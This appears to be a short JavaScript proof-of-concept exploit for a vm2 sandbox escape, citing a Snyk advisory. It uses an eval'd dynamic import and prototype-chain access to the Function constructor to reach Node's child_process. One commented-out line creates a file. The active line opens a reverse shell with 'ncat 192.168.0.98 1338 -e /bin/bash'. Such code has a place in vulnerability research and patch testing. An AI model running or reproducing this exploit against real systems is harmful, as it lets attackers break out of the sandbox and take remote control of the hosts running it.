// https://security.snyk.io/vuln/SNYK-JS-VM2-1585918
// This line is used just to trigger error from stack to control stack object -- does not actually import poc.js from what I can tell (but I tried anyway!)
res = eval('import(\'/tmp/poc.js\');');
// file creation and arbitrary commands
//res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor("return this")().process.mainModule.require("child_process").execSync("touch /tmp/fromPoc2").toString();
// reverse shell
res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor("return this")().process.mainModule.require("child_process").execSync("/bin/ncat 192.168.0.98 1338 -e /bin/bash").toString('utf8');